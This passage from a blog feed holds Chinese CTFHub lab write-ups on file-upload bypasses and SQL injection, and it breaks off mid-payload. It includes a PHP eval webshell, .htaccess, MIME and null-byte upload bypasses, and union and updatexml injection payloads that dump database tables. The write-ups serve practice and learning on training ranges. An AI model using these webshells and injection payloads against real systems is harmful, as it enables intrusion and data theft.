src="https://img-blog.csdnimg.cn/20201119125141517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>第二种方法：</strong>·</p><p>内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">AddType application/x-httpd-php .jpg<br></code></pre></td></tr></table></figure><p>就成功地使该<code>.htaccess</code>文件所在目录及其子目录中的后缀为<code>.jpg</code>的文件被Apache当做php文件</p><p>上传test.htaccess</p><p><img src="https://img-blog.csdnimg.cn/2020111920274848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传成功<br><img src="https://img-blog.csdnimg.cn/20201119202825440.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>再上传<code>3.jpg</code>，内容为<code>&lt;?php  @eval($_POST[&quot;pass&quot;]);?&gt;</code> ，获取到上传文件路径<br><img src="https://img-blog.csdnimg.cn/20201119202922137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>蚁剑连接，连接成功。<br><img src="https://img-blog.csdnimg.cn/20201119203023188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>参考文章</strong>:<a href="https://blog.csdn.net/wn314/article/details/77074477">文件解析漏洞</a></p><h2 id="0x04-MIME绕过"><a href="#0x04-MIME绕过" class="headerlink" title="0x04 MIME绕过"></a>0x04 MIME绕过</h2><p><img src="https://img-blog.csdnimg.cn/20201120222519718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>直接上传4.php，提示文件类型不正确<br><img src="https://img-blog.csdnimg.cn/20201120223830616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>来使用MIME绕过，百度了解一下<strong>MIME</strong></p><blockquote><p>  MIME(Multipurpose Internet MailExtensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p></blockquote><p><code>MIME</code>多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式每个MIME类型由两部分组成，前面是数据的大类别，例如声音 audio、图象 Image等,后面定义具体的种类。</p><p>常见的MME类型，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#text表明文件是普通文本</span><br>text/plain<br>text/html<br><span class="hljs-comment">#image表明是某种图像或者动态图(gif)</span><br>image/jpeg<br>image/png<br><span class="hljs-comment">#audio表明是某种音频文件</span><br>audio/mpeg<br>audio/ogg<br>audio<span class="hljs-comment">/*</span><br><span class="hljs-comment">#video表明是某种视频文件</span><br><span class="hljs-comment">video/mp4</span><br><span class="hljs-comment">#application表明是某种二进制数据</span><br><span class="hljs-comment">application/*</span><br><span class="hljs-comment">application/json</span><br><span class="hljs-comment">application/javascript</span><br><span class="hljs-comment">application/ecmascript</span><br><span class="hljs-comment">application/octet-stream</span><br></code></pre></td></tr></table></figure><p>上传<code>4.php</code>，使用bp抓包，修改Content-Typed的值，改成<code>Content-Type: image/jpeg</code>，然后放包<br><img src="https://img-blog.csdnimg.cn/20201120222615911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传成功，得到文件相对路径<br><img src="https://img-blog.csdnimg.cn/20201120222706592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>蚁剑连接，查找目录文件，即可得到flag<br><img src="https://img-blog.csdnimg.cn/20201120222949700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>参考文章: <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME 类型</a></p><h2 id="0x05-文件头检查"><a href="#0x05-文件头检查" class="headerlink" title="0x05 文件头检查"></a>0x05 文件头检查</h2><p><img src="https://img-blog.csdnimg.cn/20201122155831873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马5.php，提示文件类型不正确</p><p><img src="https://img-blog.csdnimg.cn/20201122155907113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br> 再把5.php修改成5.jpg上传，发现提示文件错误<br><img src="https://img-blog.csdnimg.cn/20201122160052550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>尝试<strong>MME绕过</strong>，上传<code>5.php</code>，抓包，修改Content-Typed的值，然后放包，发现提示文件错误<br><img src="https://img-blog.csdnimg.cn/20201122160839518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>应该是对文件内容进行了检测，来制作一个图片码<code>m.php</code><br><img src="https://img-blog.csdnimg.cn/20201122162645668.png#pic_center" alt="在这里插入图片描述"><br>抓包修改Content-Type的值，放包<br><img src="https://img-blog.csdnimg.cn/2020112216332349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>结果提示文件错误<br><img src="https://img-blog.csdnimg.cn/20201122193529247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>看了大师傅的wp，说尽量换小一点的图片，就会成功，这次换了一个非常小的图片，重新制作图片马<br><img src="https://img-blog.csdnimg.cn/2020112219263730.png#pic_center" alt="在这里插入图片描述"></p><p>上传flag.php，抓包修改Content-Type的值为<code>image/png</code><br><img src="https://img-blog.csdnimg.cn/20201122192734886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传成功，得到上传路径<br><img src="https://img-blog.csdnimg.cn/2020112219282666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>蚁剑连接，拿到flag<br><img src="https://img-blog.csdnimg.cn/20201122192926706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="0x06-00截断"><a href="#0x06-00截断" class="headerlink" title="0x06 00截断"></a>0x06 00截断</h2><p>了解一下00截断，<a href="http://www.admintony.com/%E5%85%B3%E4%BA%8E%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%8400%E6%88%AA%E6%96%AD%E5%88%86%E6%9E%90.html">关于上传中的00截断分析</a><br><img src="https://img-blog.csdnimg.cn/20201122170816232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马，提示文件类型不匹配, 但在url栏出现了路径信息<br><img src="https://img-blog.csdnimg.cn/20201122165152579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看源代码<br><img src="https://img-blog.csdnimg.cn/20201122165304568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传shell.jpg，抓包<br><img src="https://img-blog.csdnimg.cn/20201122165938867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>构造00截断，添加<code>shell.php%00</code>，放包<br><img src="https://img-blog.csdnimg.cn/2020112217004529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传成功路径为<code>upload/shell.php</code>，蚁剑连接<br><img src="https://img-blog.csdnimg.cn/2020112217043423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>拿到flag<br><img src="https://img-blog.csdnimg.cn/2020112217050469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="0x07-双写后缀"><a href="#0x07-双写后缀" class="headerlink" title="0x07 双写后缀"></a>0x07 双写后缀</h2><p><img src="https://img-blog.csdnimg.cn/20201122171341824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上传一句话木马shell.php，虽然上传成功，但后缀却消失了<br><img src="https://img-blog.csdnimg.cn/20201122171256124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看源码，<code>$name = str_ireplace($blacklist, &quot;&quot;, $name);</code>，变量<code>blacklist</code>里面的值会被替换，后缀被过滤了<br><img src="https://img-blog.csdnimg.cn/20201122171458940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>继续上传<code>shell.php</code>，然后抓包修改成<code>shell.pphphp</code>，中间的php字符串被过滤，剩下的<code>p</code>和<code>hp</code>就组合成了<code>php</code>。</p><p><img src="https://img-blog.csdnimg.cn/2020112217203470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>文件上传成功，得到文件上传路径<br><img src="https://img-blog.csdnimg.cn/2020112217205079.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>蚁剑连接,flag就在这<br><img src="https://img-blog.csdnimg.cn/20201122172156217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们可以通过上传一些平时不怎么用的容易被人忽视的文件扩展名，来绕过这种类型的验证。</p><p><strong>黑名单绕过</strong><br>通过上传不受欢迎的php扩展来绕过黑名单。例如：pht，phpt，phtml，php3，php4，php5，php6</p><p><strong>白名单绕过</strong><br>通过某种类型的技巧来绕过白名单，例如添加空字节注入（shell.php％00.gif），或使用双重扩展来上传文件（shell.jpg.php）。</p><p><strong>扩展名大小写来绕过</strong><br>例如：pHp，Php，phP。</p><p><strong>双写后缀绕过</strong><br>例如：pphphp</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：CTFHub靶场通关（三）&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="WEB" scheme="http://atkx.top/categories/CTF/WEB/"/>
    
    
    <category term="CTFhub" scheme="http://atkx.top/tags/CTFhub/"/>
    
    <category term="文件上传" scheme="http://atkx.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub-Web-sql注入练习</title>
    <link href="http://atkx.top/2020/11/15/CTFHub-Web-sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0/"/>
    <id>http://atkx.top/2020/11/15/CTFHub-Web-sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0/</id>
    <published>2020-11-15T04:53:30.000Z</published>
    <updated>2021-04-04T14:02:16.435Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：CTFHub靶场通关（二）</p> <a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>sql注入用到的一些相关函数<br>| 函数                        | 描述                                                         |<br>| ————————— | ———————————————————— |<br>| table_schema                | 数据库名                                                     |<br>| table_name                  | 表名                                                         |<br>| column_name                 | 列名                                                         |<br>| information_schema.schemata | 包含所有数据库的名                                           |<br>| information_schema.tables   | 包含所有库的表名                                             |<br>| information_schema.columns  | 包含所有表的字段                                             |<br>| group_concat()函数功能      | 将group by产生的同一个分组中的值连接起来，返回一个字符串结果。 |</p><h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><p>输入1<br><img src="https://img-blog.csdnimg.cn/20201114180314872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>1.判断注入类型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;        报错</span><br><span class="hljs-string">1 and 1=1 返回正确</span><br><span class="hljs-string">1 and 1=2 返回错误</span><br></code></pre></td></tr></table></figure><p>如果满足以上三条，则可以判断该URL存在数字型注入。</p><p>2.判断字段数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span>    回显正常<br><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span>    回显正常<br><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span>    返回错误<br></code></pre></td></tr></table></figure><p>所以字段数为2</p><p>3 .联合查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>    回显正常<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>           回显正常<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>         返回错误<br></code></pre></td></tr></table></figure><p>回显点位是1和2</p><p>4.爆数据库名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">-1</span> union select <span class="hljs-number">1</span>,database()<br></code></pre></td></tr></table></figure><p>当前数据库名为sqli</p><p>5.爆表名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">-1</span> union select <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where table_schema=<span class="hljs-string">&#x27;sqli&#x27;</span><br></code></pre></td></tr></table></figure><p>有两个表，一个是news，另外一个是flag</p><p>6.爆字段名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">-1</span> union select <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where table_schema=<span class="hljs-string">&#x27;sqli&#x27;</span> <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;flag&#x27;</span><br></code></pre></td></tr></table></figure><p>字段名为flag</p><p>7.爆值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload1: ?id=<span class="hljs-number">-1</span> union select <span class="hljs-number">1</span>,group_concat(flag) <span class="hljs-keyword">from</span> flag<br>Payload2: ?id=<span class="hljs-number">-1</span> union select <span class="hljs-number">1</span>,flag <span class="hljs-keyword">from</span> flag<br></code></pre></td></tr></table></figure><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p>输入1，发现sql语句数字中我们输入的1被单引号包裹，字符型注入跟数字型注入的区别就在于引号的闭合<br><img src="https://img-blog.csdnimg.cn/20201114185956833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>1.判断注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; 返回错误</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1 正常回显</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;2 返回错误</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>   返回错误，需加注释符号<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=1#  正常回显</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>#  返回错误<br></code></pre></td></tr></table></figure><p>可以判断为字符型注入</p><p>2.判断字段数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 1 #   回显正常</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span> #   回显正常<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3 #   返回错误</span><br></code></pre></td></tr></table></figure><p>所以字段数为2</p><p>3.联合查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=2 union select 1,2#  回显正常</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>#         回显正常<br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3#       返回错误</span><br></code></pre></td></tr></table></figure><p>回显点位是2和3</p><p>3.爆数据库名，得到数据库名sqli</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,database()#</span><br></code></pre></td></tr></table></figure><p>4.爆表名，得到两个表名 news,flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>sqli<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><p>5.爆字段名，字段名flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><p>6.爆值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(flag) from flag#</span><br></code></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>百度了一下报错注入，报错注入是我们通过反馈出来的错误来获取到我们所需要的信息，发现一共有<a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">十种报错注入</a>，最常用到的三种报错注入方式分别是：<code>updatexml()</code>、<code>floor()</code>、<code>extractvalue()</code>。<br>太菜了，看了下大师傅们的wp，发现这道题就是利用<code>updatexml()</code>函数进行报错注入</p><p><a href="https://www.cnblogs.com/0daybug/p/12334557.html">updatexml()语法：</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">UPDATEXML (XML_document, XPath_string, new_value);<br></code></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>XML_document</td><td>XML_document是String格式，为XML文档对象的名称，文中为Doc</td></tr><tr><td>XPath_string</td><td>XPath_string (Xpath格式的字符串) ，xpath报错只显示32位结果</td></tr><tr><td>new_value</td><td>new_value，String格式，替换查找到的符合条件的数据</td></tr></tbody></table><p><strong>updatexml的报错原理</strong>：</p><blockquote><p>updatexml第二个参数需要的是Xpath格式的字符串，但是我们第二个参数很明显不是，而是我们想要获得的数据，所以会报错，并且在报错的时候会将其内容显示出来，从而获得我们想要的数据。</p></blockquote><p>使用updatexml报错注入固定格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">payload：?id=a<span class="hljs-string">&#x27;and(updatexml(&quot;anything&quot;,concat(&#x27;</span>~<span class="hljs-string">&#x27;,(select语句())),&quot;anything&quot;))</span><br></code></pre></td></tr></table></figure><p><code>concat()</code>函数将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出想要的数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select user()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114214226330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>爆库名，查到数据库名为sqli</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select database()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114205812885.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>爆字段，一个news，一个flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where table_schema=<span class="hljs-string">&#x27;sqli&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114205926889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>爆字段名，字段名为flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: 